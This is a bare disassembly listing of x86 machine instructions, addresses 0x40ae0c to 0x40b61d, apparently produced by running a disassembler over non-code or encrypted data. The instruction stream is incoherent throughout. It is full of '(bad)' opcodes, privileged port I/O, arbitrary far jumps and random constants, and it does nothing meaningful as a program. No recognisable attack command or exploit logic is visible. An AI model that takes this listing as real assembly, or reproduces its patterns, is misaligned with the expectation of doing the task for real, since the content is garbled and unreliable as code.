  40ae0c:	sub    al,cl
  40ae0e:	add    DWORD PTR [eax-0x2a],esp
  40ae11:	cmp    ebp,ecx
  40ae13:	dec    edx
  40ae14:	xor    DWORD PTR [ecx],0xacf20852
  40ae1a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae1c:	shl    DWORD PTR [eax],1
  40ae1e:	loop   0x40ae81
  40ae20:	xor    DWORD PTR [ebp+0x3f92fc58],ebp
  40ae26:	jnp    0x40ae35
  40ae28:	call   FWORD PTR [edx+0x4f]
  40ae2b:	and    eax,0xfdac608b
  40ae30:	add    DWORD PTR [edx-0x9],edi
  40ae33:	xchg   ebx,eax
  40ae34:	push   ecx
  40ae35:	add    eax,0x419afeee
  40ae3a:	mov    cl,0xdd
  40ae3c:	cwde   
  40ae3d:	jbe    0x40aeac
  40ae3f:	call   DWORD PTR [edi-0x38]
  40ae42:	push   ss
  40ae43:	test   BYTE PTR [esi-0x69],ch
  40ae46:	dec    esp
  40ae47:	clc    
  40ae48:	adc    bl,BYTE PTR [eax-0x17]
  40ae4b:	in     eax,0x90
  40ae4d:	jne    0x40ae6b
  40ae4f:	jmp    0x40add8
  40ae51:	repnz dec ecx
  40ae53:	xlat   BYTE PTR ds:[ebx]
  40ae54:	dec    esi
  40ae55:	cs jmp 0x40ae11
  40ae58:	pop    ss
  40ae59:	fcomp  st(2)
  40ae5b:	add    BYTE PTR [esi+0x75],bl
  40ae5e:	jmp    0x1a40:0xd65d1d4b
  40ae65:	repz pushf 
  40ae67:	push   0xf5b53d45
  40ae6c:	inc    esp
  40ae6d:	scas   eax,DWORD PTR es:[edi]
  40ae6e:	xchg   ebx,eax
  40ae6f:	ins    DWORD PTR es:[edi],dx
  40ae70:	jl     0x40aebb
  40ae72:	push   bx
  40ae74:	ret    
  40ae75:	add    BYTE PTR [ebx-0x666ea33e],ah
  40ae7b:	cmp    al,BYTE PTR [ebx+ebx*8+0x67]
  40ae7f:	ja     0x40aead
  40ae81:	and    DWORD PTR [esi-0x6c21d9bc],0x22853176
  40ae8b:	loop   0x40aeea
  40ae8d:	push   esi
  40ae8e:	cmp    al,0x4e
  40ae90:	cli    
  40ae91:	mov    ch,0x12
  40ae93:	or     al,0x12
  40ae95:	fdivp  st(5),st
  40ae97:	mov    al,ds:0x7b153584
  40ae9c:	mov    ah,BYTE PTR [ecx+0x6e205979]
  40aea2:	add    al,0x8
  40aea4:	leave  
  40aea5:	in     eax,0x1c
  40aea7:	retf   
  40aea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea9:	cmp    al,0xee
  40aeab:	pushf  
  40aeac:	neg    DWORD PTR [edx-0x5af80ccb]
  40aeb2:	lahf   
  40aeb3:	and    edi,DWORD PTR [ecx-0x48]
  40aeb6:	add    eax,0xf66beee
  40aebb:	mov    ebx,0x38e916d1
  40aec0:	jecxz  0x40aec8
  40aec2:	xor    ah,BYTE PTR [eax-0x67e04450]
  40aec8:	add    DWORD PTR [eax-0x4b3c3a6],0x1e
  40aecf:	inc    esi
  40aed0:	push   edi
  40aed1:	inc    ebp
  40aed2:	mov    ah,0x7c
  40aed4:	enter  0xa53b,0x3a
  40aed8:	nop
  40aed9:	mov    bl,0xce
  40aedb:	mov    cl,ch
  40aedd:	mov    esp,0xca71ebc8
  40aee2:	daa    
  40aee3:	ret    
  40aee4:	inc    ecx
  40aee5:	mov    edx,0x8a638c15
  40aeea:	dec    edx
  40aeeb:	or     BYTE PTR [ecx-0x14],cl
  40aeee:	push   0xffffffd1
  40aef0:	add    eax,0x6b55ccbd
  40aef5:	sbb    BYTE PTR [eax-0x7f],al
  40aef8:	daa    
  40aef9:	(bad)  
  40aefa:	xchg   esi,eax
  40aefb:	jne    0x40aeb0
  40aefd:	repz (bad) 
  40aeff:	stos   DWORD PTR es:[edi],eax
  40af00:	(bad)  
  40af01:	test   al,0x66
  40af03:	and    DWORD PTR [edi+eiz*2-0x62],0xffffffa8
  40af08:	xchg   BYTE PTR [edi+0x6b794051],ah
  40af0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af0f:	dec    edx
  40af10:	dec    eax
  40af11:	mov    ds:0x941c1b4d,al
  40af16:	cmp    cl,BYTE PTR [ebx-0x16]
  40af19:	cmp    al,0x6a
  40af1b:	xor    BYTE PTR [esi],0x5f
  40af1e:	mov    eax,ds:0x7c7315d9
  40af23:	in     al,dx
  40af24:	add    eax,0xec190b19
  40af29:	retf   0x79d9
  40af2c:	push   ebx
  40af2d:	mov    ecx,0xeb8aed5d
  40af32:	cli    
  40af33:	xchg   esi,eax
  40af34:	xor    BYTE PTR [edx-0x79],cl
  40af37:	test   eax,0xf2feb92e
  40af3c:	jae    0x40af4d
  40af3e:	mov    eax,ds:0xedf4900e
  40af43:	enter  0x6de2,0x4a
  40af47:	lock (bad) 
  40af49:	ins    DWORD PTR es:[edi],dx
  40af4a:	clc    
  40af4b:	(bad)  
  40af4c:	leave  
  40af4d:	(bad)  
  40af4f:	pop    esp
  40af50:	xor    edi,ebp
  40af52:	jo     0x40af31
  40af54:	sbb    eax,0xf3426274
  40af59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af5a:	icebp  
  40af5b:	jmp    0x318ababe
  40af60:	jnp    0x40af9c
  40af62:	cdq    
  40af63:	retf   0xbb3a
  40af66:	mov    al,ds:0x465d6959
  40af6b:	sahf   
  40af6c:	mov    edi,0xc3e3cfb8
  40af71:	pop    esp
  40af72:	push   0xfffffff4
  40af74:	add    BYTE PTR [ecx-0x3b12a1b9],dl
  40af7a:	xor    BYTE PTR [edx+0x32d20a35],ah
  40af80:	jge    0x40afa9
  40af82:	xchg   ebx,eax
  40af83:	or     cl,BYTE PTR ds:0xbb195b55
  40af89:	cwde   
  40af8a:	call   0xbebf31cb
  40af8f:	ds cs pop ds
  40af92:	in     al,0xb
  40af94:	pop    ds
  40af95:	xor    DWORD PTR [edi+ebx*1-0x7f],eax
  40af99:	repz daa 
  40af9b:	out    dx,al
  40af9c:	stos   BYTE PTR es:[edi],al
  40af9d:	mov    dl,0xe9
  40af9f:	das    
  40afa0:	loope  0x40af6d
  40afa2:	outs   dx,BYTE PTR ds:[esi]
  40afa3:	pusha  
  40afa4:	pop    ebx
  40afa5:	push   0x9b15ae31
  40afaa:	add    BYTE PTR [ebx+ecx*4-0x30],al
  40afae:	jns    0x40b01e
  40afb0:	retf   0x5e58
  40afb3:	dec    ebx
  40afb4:	add    DWORD PTR [esi-0x2d791ca8],esp
  40afba:	ss sbb dh,cl
  40afbd:	inc    ecx
  40afbe:	std    
  40afbf:	inc    esp
  40afc0:	(bad)  
  40afc1:	mov    ecx,ebx
  40afc3:	jne    0x40af91
  40afc5:	sub    ah,ah
  40afc7:	cmp    eax,0xfc475af7
  40afcc:	mov    eax,0x9a29e2ef
  40afd1:	jle    0x40afa2
  40afd3:	mov    eax,ds:0xb85d42c1
  40afd8:	retf   
  40afd9:	int    0x5c
  40afdb:	ins    DWORD PTR es:[edi],dx
  40afdc:	mov    ds:0xffdb67c6,eax
  40afe1:	sub    al,0xe5
  40afe3:	stos   BYTE PTR es:[edi],al
  40afe4:	push   ecx
  40afe5:	dec    esi
  40afe6:	popf   
  40afe7:	mov    eax,ds:0xf09393a4
  40afec:	mov    esp,0xd4e6aac0
  40aff1:	cmp    ch,bh
  40aff3:	in     al,0xa1
  40aff5:	and    ecx,ecx
  40aff7:	mov    al,0xef
  40aff9:	sti    
  40affa:	int3   
  40affb:	push   esp
  40affc:	cmp    al,0x14
  40affe:	rcl    DWORD PTR [edi],1
  40b000:	arpl   WORD PTR [edx],dx
  40b002:	sbb    eax,0x1d762809
  40b007:	or     BYTE PTR [ecx+0x52],ch
  40b00a:	cmp    DWORD PTR [edi+0x7],ecx
  40b00d:	stos   BYTE PTR es:[edi],al
  40b00e:	arpl   WORD PTR [ecx-0x788f1d5a],sp
  40b014:	sbb    DWORD PTR [ebx-0x28a929bc],eax
  40b01a:	retf   0x6b0e
  40b01d:	std    
  40b01e:	xor    esp,edi
  40b020:	div    DWORD PTR [eax-0x32]
  40b023:	(bad)  
  40b024:	jae    0x40b06b
  40b026:	mov    dh,0x9b
  40b028:	mov    DWORD PTR [esi+0x395cd8e9],eax
  40b02e:	jp     0x40b0a9
  40b030:	add    DWORD PTR [edi],ebx
  40b032:	cwde   
  40b033:	jne    0x40b009
  40b035:	add    esp,edi
  40b037:	xor    eax,0x5b11f3f0
  40b03c:	jno    0x40b070
  40b03e:	call   0x76d7b049
  40b043:	(bad)  
  40b044:	mov    bh,0xbc
  40b046:	mov    bh,0xe2
  40b048:	jmp    0x3ff589ee
  40b04d:	shr    edi,cl
  40b04f:	add    DWORD PTR [ebx-0x22],0x7f
  40b053:	lods   eax,DWORD PTR ds:[esi]
  40b054:	lock lds edi,FWORD PTR [edx]
  40b057:	(bad)  
  40b058:	pop    ecx
  40b059:	popa   
  40b05a:	pop    ss
  40b05b:	shl    BYTE PTR [eax],0x1f
  40b05e:	dec    edx
  40b05f:	and    ch,BYTE PTR [edx+0x46]
  40b062:	jmp    FWORD PTR [edx+eiz*8+0x6dfe25a]
  40b069:	mov    edi,0x30de3539
  40b06e:	mov    ?,WORD PTR [edi]
  40b070:	ret    0x354d
  40b073:	push   0x2c
  40b075:	(bad)  
  40b076:	fwait
  40b077:	xlat   BYTE PTR ds:[ebx]
  40b078:	pop    ecx
  40b079:	and    eax,0x56d1ce35
  40b07e:	(bad)  
  40b07f:	cmp    al,0x6d
  40b081:	mov    al,0x86
  40b083:	in     al,dx
  40b084:	jbe    0x40b100
  40b086:	adc    al,0xc6
  40b088:	test   al,0x40
  40b08a:	les    ebp,FWORD PTR ds:0x569bc1dd
  40b090:	adc    dl,BYTE PTR [ecx]
  40b092:	sub    ch,BYTE PTR [esi]
  40b094:	(bad)  
  40b095:	lods   al,BYTE PTR ds:[esi]
  40b096:	mov    ah,0xbb
  40b098:	aad    0x60
  40b09a:	cmp    ebx,DWORD PTR ds:0x19202f53
  40b0a0:	mov    edi,0x582a5d5b
  40b0a5:	pop    es
  40b0a6:	adc    DWORD PTR [ecx+0x14],0xffffffa3
  40b0aa:	rcl    BYTE PTR [ebx+0x32],1
  40b0ad:	pushf  
  40b0ae:	and    al,ch
  40b0b0:	je     0x40b055
  40b0b2:	test   BYTE PTR [esi-0x32],dh
  40b0b5:	sub    DWORD PTR [eax],ebp
  40b0b7:	mov    ecx,0xae304000
  40b0bc:	push   esp
  40b0bd:	outs   dx,DWORD PTR ds:[esi]
  40b0be:	ret    
  40b0bf:	xor    bh,BYTE PTR [ebp+0xf]
  40b0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c3:	xchg   BYTE PTR [ebp-0x7],dl
  40b0c6:	pusha  
  40b0c7:	mov    BYTE PTR [ebx-0x21],bl
  40b0ca:	test   BYTE PTR [ecx+0x4a7d0aa9],al
  40b0d0:	push   esi
  40b0d1:	jno    0x40b129
  40b0d3:	cmp    eax,0x84916f14
  40b0d8:	sub    eax,0xe589d0bb
  40b0dd:	es jno 0x40b0e1
  40b0e0:	imul   esi,DWORD PTR [ecx+0x67b46bdd],0x79
  40b0e7:	gs addr16 push eax
  40b0ea:	call   0xd202:0x81976489
  40b0f1:	add    BYTE PTR [ecx],cl
  40b0f3:	xor    al,0x42
  40b0f5:	mov    ds:0xc4eb1978,al
  40b0fa:	xchg   edx,eax
  40b0fb:	push   edi
  40b0fc:	sub    al,0xf8
  40b0fe:	pop    ecx
  40b0ff:	xchg   ebx,eax
  40b100:	repnz pushf 
  40b102:	scas   eax,DWORD PTR es:[edi]
  40b103:	push   cs
  40b104:	fnsave [edx+0x2a]
  40b107:	fcom   QWORD PTR [eax-0x31]
  40b10a:	loop   0x40b116
  40b10c:	test   al,0x30
  40b10e:	add    BYTE PTR [eax-0x4c57bba1],ah
  40b114:	dec    ebx
  40b115:	gs inc edi
  40b117:	add    ah,BYTE PTR [eax+0x6c53b8c3]
  40b11d:	fcmovne st,st(0)
  40b11f:	mov    cl,0xc6
  40b121:	dec    ebp
  40b122:	cdq    
  40b123:	inc    edi
  40b124:	sbb    eax,0xb09890b7
  40b129:	out    0x6a,al
  40b12b:	adc    BYTE PTR [ebp-0x6d7348c3],0x6e
  40b132:	int    0x21
  40b134:	ins    DWORD PTR es:[edi],dx
  40b135:	iret   
  40b136:	clc    
  40b137:	mov    WORD PTR [ebx+0x2a9337be],?
  40b13d:	shr    DWORD PTR [ebx+0x48384495],cl
  40b143:	and    eax,0x84823cee
  40b148:	and    al,0x7e
  40b14a:	scas   al,BYTE PTR es:[edi]
  40b14b:	in     eax,0x55
  40b14d:	shl    DWORD PTR [edi+0x24800f89],0xe
  40b154:	fidivr WORD PTR [edx+0x17]
  40b157:	push   0x49
  40b159:	sub    edx,DWORD PTR [esi]
  40b15b:	(bad)  
  40b15c:	jnp    0x40b138
  40b15e:	cmp    cl,dl
  40b160:	icebp  
  40b161:	test   al,0x32
  40b163:	mov    esp,0x21bdd26a
  40b168:	(bad)  
  40b169:	cwde   
  40b16a:	xchg   esp,eax
  40b16b:	xchg   esp,eax
  40b16c:	ins    DWORD PTR es:[edi],dx
  40b16d:	xchg   ebp,eax
  40b16e:	test   DWORD PTR [esi+0x3b804999],eax
  40b174:	repnz std 
  40b176:	xor    al,0x59
  40b178:	adc    BYTE PTR [esi],ah
  40b17a:	mov    cl,0x27
  40b17c:	and    esp,DWORD PTR [ebp-0x3f]
  40b17f:	lods   eax,DWORD PTR ds:[esi]
  40b180:	stc    
  40b181:	mov    esi,DWORD PTR [eax+0x67b715f7]
  40b187:	jne    0x40b1ad
  40b189:	shl    ch,1
  40b18b:	push   edx
  40b18c:	ffree  st(2)
  40b18e:	cmp    al,0x6d
  40b190:	mov    ?,WORD PTR [ebp-0x7b]
  40b193:	jge    0x40b173
  40b195:	adc    DWORD PTR [ebx+esi*1+0xee0ce32],esp
  40b19c:	mov    BYTE PTR [ebx+0x43c91c5c],al
  40b1a2:	les    esi,FWORD PTR [ebx]
  40b1a4:	test   BYTE PTR [eax+0x26],bl
  40b1a7:	mov    DWORD PTR [edi+0x30],esp
  40b1aa:	and    eax,0x59843261
  40b1af:	add    DWORD PTR [ebp+0x2ce91735],ebx
  40b1b5:	jge    0x40b17e
  40b1b7:	pop    ds
  40b1b8:	mov    ebx,0xdb733e34
  40b1bd:	mov    al,0xf2
  40b1bf:	mov    BYTE PTR [ebx],dl
  40b1c1:	aas    
  40b1c2:	ds (bad) 
  40b1c4:	enter  0xa864,0x98
  40b1c8:	dec    ebx
  40b1c9:	adc    edx,ebp
  40b1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1cc:	ds (bad) 
  40b1ce:	lock mov ds:0xf5335368,eax
  40b1d4:	inc    ebp
  40b1d5:	push   0x55
  40b1d7:	dec    esp
  40b1d8:	or     ebp,DWORD PTR [esi+0x2a966576]
  40b1de:	(bad)
  40b1e1:	pop    esi
  40b1e2:	bound  esp,QWORD PTR [edx]
  40b1e4:	in     eax,0x1e
  40b1e6:	scas   al,BYTE PTR es:[edi]
  40b1e7:	push   edi
  40b1e8:	jae    0x40b1c2
  40b1ea:	add    DWORD PTR [ecx],esp
  40b1ec:	push   ebp
  40b1ed:	push   0x5c2e7d7e
  40b1f2:	inc    ecx
  40b1f3:	xchg   bl,dl
  40b1f5:	mov    ss,WORD PTR [edx+edi*1]
  40b1f8:	add    eax,0x21be7a00
  40b1fd:	jno    0x40b19a
  40b1ff:	sub    al,bh
  40b201:	int    0xa5
  40b203:	mov    ds:0xee234b3d,eax
  40b208:	push   ebp
  40b209:	(bad)  
  40b20a:	xor    BYTE PTR [eax],dl
  40b20c:	xchg   ebp,eax
  40b20d:	pop    esp
  40b20e:	stos   BYTE PTR es:[edi],al
  40b20f:	inc    edi
  40b210:	fnstenv [ebp+edx*2+0x63]
  40b214:	mov    DWORD PTR [ecx+0x6bb204b9],0xdf38c5ed
  40b21e:	mov    esi,0x293c87a0
  40b223:	sub    DWORD PTR [edi+edi*8],eax
  40b226:	stc    
  40b227:	xchg   ebp,eax
  40b228:	repz pop esi
  40b22a:	fdivp  st(0),st
  40b22c:	cld    
  40b22d:	sbb    bh,dh
  40b22f:	inc    ebx
  40b230:	pusha  
  40b231:	repnz sbb cl,BYTE PTR [edi]
  40b234:	lahf   
  40b235:	sbb    al,0x1
  40b237:	mov    ebp,0x3cd67b83
  40b23c:	dec    edx
  40b23d:	jno    0x40b241
  40b23f:	jb     0x40b264
  40b241:	cmp    DWORD PTR [edi-0x1ede663a],ecx
  40b247:	ins    BYTE PTR es:[edi],dx
  40b248:	icebp  
  40b249:	test   DWORD PTR [ebx-0x17d29081],edx
  40b24f:	mov    edi,0x27e10f09
  40b254:	adc    cl,bl
  40b256:	cmp    ah,ah
  40b258:	and    DWORD PTR [edi],ebp
  40b25a:	and    BYTE PTR [ebx+0x2],dh
  40b25d:	test   al,0x31
  40b25f:	pop    esp
  40b260:	sbb    al,0x51
  40b262:	mov    al,0xb
  40b264:	mov    bh,bl
  40b266:	lahf   
  40b267:	push   ds
  40b268:	xor    esi,edi
  40b26a:	or     bl,cl
  40b26c:	outs   dx,BYTE PTR ds:[esi]
  40b26d:	xchg   esi,eax
  40b26e:	jmp    0xe177:0x6914ee82
  40b275:	add    BYTE PTR [eax-0x51],al
  40b278:	pop    ds
  40b279:	pushf  
  40b27a:	jmp    0x40b229
  40b27c:	inc    eax
  40b27d:	loop   0x40b2d6
  40b27f:	test   DWORD PTR [edx-0x6c7e8dce],edx
  40b285:	loope  0x40b2e5
  40b287:	es aas 
  40b289:	and    DWORD PTR [esi],esp
  40b28b:	(bad)  
  40b28c:	in     al,0xd7
  40b28e:	lods   eax,DWORD PTR ds:[esi]
  40b28f:	sbb    ebp,DWORD PTR [ebx-0x31]
  40b292:	mov    ds:0x3c7319c7,eax
  40b297:	addr16 mov fs:0x46e1,eax
  40b29c:	mov    ebx,0x913da06e
  40b2a1:	out    0x7f,eax
  40b2a3:	enter  0x9f1c,0x5
  40b2a7:	xchg   edi,eax
  40b2a8:	leave  
  40b2a9:	xchg   ch,dh
  40b2ab:	or     DWORD PTR [esp+eiz*4-0x277b7bc2],ecx
  40b2b2:	rcl    BYTE PTR [edx+ebx*1],cl
  40b2b5:	jno    0x40b237
  40b2b7:	jns    0x40b279
  40b2b9:	xor    DWORD PTR [edx],0xfffffff4
  40b2bc:	bound  esi,QWORD PTR [eax]
  40b2be:	and    eax,0xc10f02c
  40b2c3:	sub    edx,edi
  40b2c5:	push   0xffffffc2
  40b2c7:	mov    ds:0xb9df444c,al
  40b2cc:	cmp    al,ch
  40b2ce:	pop    ebx
  40b2cf:	sub    bl,BYTE PTR [edx-0x37]
  40b2d2:	rol    DWORD PTR [edi+edx*1-0x52762100],cl
  40b2d9:	jg     0x40b2ea
  40b2db:	push   ebx
  40b2dc:	sbb    BYTE PTR ds:0x8cdea7a3,dl
  40b2e2:	jb     0x40b305
  40b2e4:	jmp    0xa4ab:0x30feb61a
  40b2eb:	add    DWORD PTR [esi+0x11],ecx
  40b2ee:	sub    eax,0x59642a0c
  40b2f3:	jb     0x40b29a
  40b2f5:	cmp    eax,0x76b037a5
  40b2fa:	cs or  ah,bh
  40b2fd:	ins    DWORD PTR es:[edi],dx
  40b2fe:	sbb    eax,ebx
  40b300:	out    dx,eax
  40b301:	idiv   BYTE PTR [ebx-0x53]
  40b304:	sbb    DWORD PTR [ebx+0xaa3fc7f],edi
  40b30a:	fistp  DWORD PTR [ebp-0x4617ce09]
  40b310:	ins    DWORD PTR es:[edi],dx
  40b311:	popf   
  40b312:	or     BYTE PTR [ebx],bl
  40b314:	or     cl,BYTE PTR [eax]
  40b316:	jmp    0x1c14ed88
  40b31b:	mov    edx,DWORD PTR [eax]
  40b31d:	scas   eax,DWORD PTR es:[edi]
  40b31e:	cli    
  40b31f:	fild   WORD PTR [ecx+0x53]
  40b322:	mov    ebx,DWORD PTR cs:[ecx-0x23]
  40b326:	xlat   BYTE PTR ds:[ebx]
  40b327:	fidivr WORD PTR [esp+ebx*2-0x5b]
  40b32b:	in     eax,dx
  40b32c:	(bad)  [ecx+esi*2+0x59]
  40b330:	sbb    BYTE PTR [ebx],dl
  40b332:	push   ebp
  40b333:	cwde   
  40b334:	hlt    
  40b335:	(bad)  
  40b337:	mov    esi,0x217bc03
  40b33c:	test   DWORD PTR [eax-0x63d55292],ecx
  40b342:	cli    
  40b343:	fnstsw ax
  40b345:	fcomi  st,st(7)
  40b347:	pop    ebp
  40b348:	jg     0x40b2dd
  40b34a:	ret    0x2540
  40b34d:	mov    cs,WORD PTR [eax]
  40b34f:	out    0xb,eax
  40b351:	rol    DWORD PTR [ecx-0x73],0x1d
  40b355:	or     eax,0xd3dbea93
  40b35a:	js     0x40b39a
  40b35c:	mov    al,BYTE PTR [ebp-0x46]
  40b35f:	push   esp
  40b360:	mov    eax,0x89a893ba
  40b365:	or     eax,DWORD PTR [esi-0x5d51aef6]
  40b36b:	addr16 pop ebx
  40b36d:	jl     0x40b343
  40b36f:	nop
  40b370:	sar    BYTE PTR ds:0xb29df1f9,0x70
  40b377:	pop    edx
  40b378:	sbb    bh,BYTE PTR [eax]
  40b37a:	jmp    0x40b32c
  40b37c:	aam    0x5a
  40b37e:	xlat   BYTE PTR ds:[ebx]
  40b37f:	and    al,0x6f
  40b381:	in     al,dx
  40b382:	in     eax,dx
  40b383:	sti    
  40b384:	(bad)  
  40b385:	adc    eax,0x8804260b
  40b38a:	add    eax,0xc17035e4
  40b38f:	(bad)  
  40b390:	pop    ebp
  40b391:	lods   eax,DWORD PTR ds:[esi]
  40b392:	imul   ebp,DWORD PTR [ecx+0x46b53aca],0x71
  40b399:	scas   al,BYTE PTR es:[edi]
  40b39a:	push   cs
  40b39b:	mov    edi,0x5449f2f0
  40b3a0:	nop
  40b3a1:	pop    ebx
  40b3a2:	ins    DWORD PTR es:[edi],dx
  40b3a3:	fdivr  DWORD PTR [ecx]
  40b3a5:	pop    ss
  40b3a6:	adc    al,BYTE PTR [edx]
  40b3a8:	mov    bl,0x9e
  40b3aa:	adc    al,0x7a
  40b3ac:	dec    ebx
  40b3ad:	aad    0x21
  40b3af:	jbe    0x40b413
  40b3b1:	data16 mov bl,0xea
  40b3b4:	leave  
  40b3b5:	repz fld QWORD PTR [ebp-0x508667ff]
  40b3bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3bd:	imul   ebx,ebx,0x6e
  40b3c0:	jle    0x40b3cb
  40b3c2:	mov    dl,0x94
  40b3c4:	leave  
  40b3c5:	shl    DWORD PTR [ebx+0x1cfe077e],0xd8
  40b3cc:	fistp  QWORD PTR [edx]
  40b3ce:	jnp    0x40b37f
  40b3d0:	sahf   
  40b3d1:	out    0x38,eax
  40b3d3:	inc    ebp
  40b3d4:	imul   ebp,edi,0x99d3bfc4
  40b3da:	push   esi
  40b3db:	adc    eax,0x44885deb
  40b3e0:	inc    ebp
  40b3e1:	sbb    eax,0x1fb5abf4
  40b3e6:	mul    DWORD PTR [edi+0x4e]
  40b3e9:	in     eax,dx
  40b3ea:	cld    
  40b3eb:	repnz mov eax,0xc5f18993
  40b3f1:	mov    ah,0x72
  40b3f3:	cmp    eax,0xe687e3da
  40b3f8:	clc    
  40b3f9:	cmp    esp,DWORD PTR [esi-0x2257b391]
  40b3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b400:	(bad)  [edi+0x4]
  40b403:	and    dl,BYTE PTR [ebp-0x63219998]
  40b409:	pop    eax
  40b40a:	pop    ss
  40b40b:	mov    edi,0x9d7416c8
  40b410:	ss xchg esi,eax
  40b412:	inc    edx
  40b413:	mov    eax,ds:0xc900853c
  40b418:	push   ebp
  40b419:	pop    edi
  40b41a:	fwait
  40b41b:	xor    al,0xb
  40b41d:	(bad)  [esp+eiz*4+0x796d5352]
  40b424:	jne    0x40b42a
  40b426:	jo     0x40b44d
  40b428:	in     eax,dx
  40b429:	inc    ecx
  40b42a:	mov    al,ds:0xed77b81e
  40b42f:	and    BYTE PTR [eax],al
  40b431:	shl    ah,1
  40b433:	into   
  40b434:	sbb    edx,edi
  40b436:	xor    ebx,DWORD PTR [ebx]
  40b438:	mov    cl,0x91
  40b43a:	(bad)  
  40b43b:	sbb    al,BYTE PTR cs:[edx+0x20]
  40b43f:	dec    ebp
  40b440:	fisttp WORD PTR [edx]
  40b442:	mov    al,ds:0x7983383f
  40b447:	add    BYTE PTR ds:0xcb9dedfb,0x39
  40b44e:	xor    eax,0x4719ac17
  40b453:	rcl    DWORD PTR [ecx-0xc],1
  40b456:	nop
  40b457:	pushf  
  40b458:	sbb    DWORD PTR [ebp-0x438b5be3],esi
  40b45e:	dec    esp
  40b45f:	mul    DWORD PTR [ebp+0x36]
  40b462:	jmp    0x7c8f:0x14d09d77
  40b469:	pushf  
  40b46a:	xchg   esi,eax
  40b46b:	lahf   
  40b46c:	xchg   dx,ax
  40b46e:	mov    al,ds:0xa2f0d8b7
  40b473:	outs   dx,BYTE PTR ds:[esi]
  40b474:	dec    al
  40b476:	and    al,0x75
  40b478:	jle    0x40b3ff
  40b47a:	mov    ecx,0xbed53b98
  40b47f:	and    cl,bh
  40b481:	mov    eax,ds
  40b483:	xor    bh,BYTE PTR [edx-0x12]
  40b486:	int3   
  40b487:	add    eax,0xbb37874c
  40b48c:	xchg   ebp,eax
  40b48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b48e:	jae    0x40b441
  40b490:	cld    
  40b491:	(bad)  
  40b492:	cli    
  40b493:	jp     0x40b452
  40b495:	sti    
  40b496:	mov    DWORD PTR [eax],eax
	...
  40b514:	out    0x10,eax
  40b516:	jge    0x40b4f1
  40b518:	(bad)  
  40b519:	std    
  40b51a:	out    0x3e,eax
  40b51c:	lods   eax,DWORD PTR ds:[esi]
  40b51d:	add    dh,ah
  40b51f:	shl    DWORD PTR [edx+edi*8+0x6629d213],cl
  40b526:	add    BYTE PTR [eax],al
  40b528:	imul   eax,DWORD PTR [edi],0x0
  40b52b:	add    BYTE PTR [ebx],cl
  40b52d:	cmp    DWORD PTR [ebx],eax
  40b52f:	sar    BYTE PTR [eax+0x1f],1
  40b532:	mul    bl
  40b534:	push   ss
  40b535:	lock mov bh,0xec
  40b538:	leave  
  40b539:	mov    es,WORD PTR [eax+edx*1]
  40b53c:	push   eax
  40b53d:	xlat   BYTE PTR ds:[ebx]
  40b53e:	dec    ebp
  40b53f:	add    esi,DWORD PTR gs:[ebx-0xefdec18]
  40b546:	pop    ebp
  40b547:	mov    al,ds:0x7842a107
  40b54c:	jmp    0x40b5a6
  40b54e:	aam    0x8b
  40b550:	stc    
  40b551:	inc    edi
  40b552:	or     eax,0xa93d65ec
  40b557:	ins    DWORD PTR es:[edi],dx
  40b558:	ins    DWORD PTR es:[edi],dx
  40b559:	sub    eax,0x35862781
  40b55e:	cmp    dh,BYTE PTR [eax+eiz*1+0x7be258c6]
  40b565:	sub    esp,DWORD PTR [eax+0x771e546]
  40b56b:	gs stc 
  40b56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b56e:	ret    
  40b56f:	push   ebp
  40b570:	jmp    edx
  40b572:	jae    0x40b54c
  40b574:	and    esp,ecx
  40b576:	lods   eax,DWORD PTR ds:[esi]
  40b577:	mov    ds:0xbf4e612a,eax
  40b57c:	test   al,0xb9
  40b57e:	fsub   DWORD PTR [eax]
  40b580:	ins    DWORD PTR es:[edi],dx
  40b581:	enter  0xa95d,0xcf
  40b585:	sub    DWORD PTR ds:0x201cfc2d,0xa2216bf7
  40b58f:	ror    DWORD PTR [edi-0x468f76a6],cl
  40b595:	fs fs dec eax
  40b598:	aas    
  40b599:	lfs    ecx,FWORD PTR [ecx]
  40b59c:	aaa    
  40b59d:	jl     0x40b590
  40b59f:	jmp    0x40b608
  40b5a1:	push   ebp
  40b5a2:	push   ds
  40b5a3:	mov    ch,BYTE PTR ds:0xf6cee2fe
  40b5a9:	ja     0x40b5c2
  40b5ab:	clc    
  40b5ac:	push   es
  40b5ad:	sub    ebp,DWORD PTR [edi]
  40b5af:	(bad)  
  40b5b1:	ret    0x676a
  40b5b4:	adc    eax,0x9114706b
  40b5b9:	lahf   
  40b5ba:	jae    0x40b57c
  40b5bc:	push   ebp
  40b5bd:	mov    edi,0xa2cf04e7
  40b5c2:	inc    esi
  40b5c3:	xchg   ebx,eax
  40b5c4:	pop    esi
  40b5c5:	push   es
  40b5c6:	dec    esp
  40b5c7:	mov    dh,dl
  40b5c9:	or     ebx,DWORD PTR [eax-0x7153b46d]
  40b5cf:	mov    ebp,0x294539b9
  40b5d4:	inc    ecx
  40b5d5:	dec    ebp
  40b5d6:	rol    DWORD PTR [edi+ebp*4-0x60820f34],1
  40b5dd:	test   al,0xf8
  40b5df:	mov    esp,0x697ed1e7
  40b5e4:	pop    ecx
  40b5e5:	int    0xdc
  40b5e7:	inc    ecx
  40b5e8:	push   esp
  40b5e9:	scas   eax,DWORD PTR es:[edi]
  40b5ea:	retf   0x5563
  40b5ed:	ret    0x8ef8
  40b5f0:	mov    ah,0xb9
  40b5f2:	daa    
  40b5f3:	xor    eax,0xbb37e3af
  40b5f8:	das    
  40b5f9:	fnstenv [ebx+0x72]
  40b5fc:	fcomp  QWORD PTR [esp+esi*8+0x76915dc9]
  40b603:	sub    BYTE PTR [edi-0x5f12e1dc],ch
  40b609:	xchg   ebp,eax
  40b60a:	or     edx,DWORD PTR ds:0x3b8f30c0
  40b610:	(bad)  
  40b611:	hlt    
  40b612:	imul   ebp,DWORD PTR cs:[esi+0x38172e48],0xe1f58559
  40b61d:	xor    esp,DWORD PTR [edx]
